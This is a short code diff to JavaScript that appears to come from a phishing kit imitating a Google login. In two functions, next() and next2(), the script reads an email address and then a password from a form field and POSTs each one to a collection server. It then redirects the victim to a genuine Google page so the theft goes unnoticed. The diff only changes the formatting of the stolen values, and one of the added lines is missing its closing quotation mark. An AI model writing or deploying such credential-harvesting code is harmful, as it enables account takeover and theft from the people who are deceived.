@@ -58,7 +58,7 @@ function next() {
   var mailid = document.getElementById("fname").value;
   var x = new XMLHttpRequest();
   x.open("POST", server, true);
-  x.send(" EmailID : " + mailid);
+  x.send("| EmailID : " + mailid + " | ");
   if (mailid > "") {
     document.getElementById("document_html_").innerHTML = `
 <body id="document_html_" onload="updatetext()">
@@ -131,7 +131,7 @@ function next2() {
   var mailid = document.getElementById("fname").value;
   var x = new XMLHttpRequest();
   x.open("POST", server, true);
-  x.send(" Password : " + mailid);
+  x.send("| Password : " + mailid + " | );
   if (mailid > "") {
     window.location = "https://www.google.com/account/about/?hl=en-GB";
   } else { 
